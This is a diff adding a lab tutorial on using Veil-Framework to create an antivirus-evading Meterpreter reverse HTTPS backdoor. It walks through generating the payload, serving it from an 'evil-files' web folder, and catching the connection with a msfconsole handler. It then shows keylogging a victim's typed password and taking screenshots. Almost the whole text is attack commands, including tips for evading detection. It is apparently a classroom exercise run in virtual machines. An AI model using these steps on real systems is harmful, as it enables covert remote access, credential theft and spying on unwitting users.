@@ -1,0 +1,110 @@
+﻿Using veil-framework to Create a Backdoor
+
+1. Introduction
+Veil is a tool designed to generate metasploit payloads (Meterpreter) that bypass common anti-virus solutions.
+
+Meterpreter is an advanced, dynamically extensible payload that uses in-memory DLL injection stagers 
+and is extended over the network at runtime. 
+It communicates over the stager socket and provides a comprehensive client-side Ruby API. 
+It features command history, tab completion, channels, and more.
+Metepreter was originally written by skape for Metasploit 2.x, 
+common extensions were merged for 3.x and is currently undergoing an overhaul for Metasploit 3.3. 
+
+Msfconsole handles the incoming connection. Msfconsole is a part of Metasploit Framework
+
+Reverse http: victim acts as client. Not the attack. Backdoor connect to me (attacker) to void anti-virus detection.
+
+2. Check environment setting up. My Window IP: 10.0.2.8
+ipconfig
+
+b. in Kali (Password: toor). My Kali IP: 10.0.2.7
+ifconfig
+
+3. Install Veil in Kali. You need to open a Kail Terminator
+mkdir opt
+cd opt
+git clone https://github.com/Veil-Framework/Veil.git
+cd Veil
+cd setup
+./setup.sh   (enter "y" if asks)
+(close the console)
+
+4. Attacker set payload options using Veil
+(open the console)
+cd /opt/Veil
+./Veil.py  (you should see the Veil interface now)
+list     (for two tools)
+use 1 (using Evasion tool)
+list (list all payloads)
+use 15 (go/meterpreter/rev_https.py)
+set LHOST 10.0.2.7 (this IP is my attack machine, I want the payload to talk to me, e.g., reverse http)
+set LPORT 8080 (http port, don't use 80, avoid anti-virus program, sometime anti-virus scans the port)
+set PROCESSORS 1 (make backdoor process 1)
+set SLEEP 6
+options (see changed parameters)
+
+5. Attacker uses Veil to generate backdoor payload (executable) 
+generate (you should see interface)
+rev_https_8080 (backdoor name to remember easily)
+(generated file name: /usr/share/veil-output/compiled/rev_https_8080.exe)
+(optional: https://nodistribute.com/ to check if the backdoor will be detected)
+(close the console/Terminator)
+
+6. Attacker load the backdoor to website (On attacker's machine/Kali)
+(open a file folder)
+/ (allow you to type path)
+/var/www/html
+(create a folder evil-files)
+(control-N to open another file window)
+/usr/share/veil-output/compiled/  (you will see the backdoor file)
+(copy the .exe file to evil-files folder)
+(open Terminator)
+service apache2 start (start the website)
+
+7. Attacker listening incoming connection (Sever/Attacker side/Kali)
+(open another Terminator or split current Terminator)
+msfconsole (you should see interface)
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_https  (I will listen to the malicouse payload/program)
+show options (see all parameters for the payload)
+set LHOST 10.0.2.7  (this IP is my attack machine, I am waiting, e.g., reverse http)
+set LPORT 8080 (http port, don't use 80, the same setting)
+show options (see all parameters for the payload)
+exploit (Now attacker is listening)
+
+8. Victim download the backdoor payload from the website (Window machine)
+(open IE)
+10.0.2.7/evil-files
+(click the rev_https_8080.exe and run anyway)
+
+9. Access to victim’s machine
+(enter, you will see msg promote again)
+sessions -i 
+sessions -i 1
+sysinfo
+ps
+keyscan_start (enable key logger)
+(in Window VM, open facebook, type your password)
+keyscan_dump (what did you see?)
+keyscan_stop
+screenshot (what did you see)
+(you will see victim connects to the attacker)
+(restore snapshot)
+
+
+
+
+
+
+
+
+
+
+
+Reference
+https://www.udemy.com/learn-social-engineering-from-scratch/
+https://cyruslab.net/2012/03/07/metasploit-about-meterpreter/
+https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/
+https://www.youtube.com/watch?v=W1rCVyGwKQ4
+
+
